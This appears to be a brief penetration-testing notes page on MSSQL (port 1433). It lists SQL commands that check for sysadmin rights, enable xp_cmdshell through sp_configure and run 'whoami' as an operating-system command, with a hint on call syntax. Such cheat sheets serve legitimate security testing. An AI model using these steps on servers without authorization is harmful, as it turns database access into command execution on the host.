# 1433 - MSSQL

{% page-ref page="../tools/mssqlclient.py-impacket.md" %}

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');

EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;

EXEC sp_configure 'xp_cmdshell', 1
reconfigure;

xp_cmdshell "whoami"
```

{% hint style="info" %}
Compare the following syntax \(note the `;)`

* `EXEC xp_cmdshell "whoami";`
* `xp_cmdshell "whoami"`
{% endhint %}



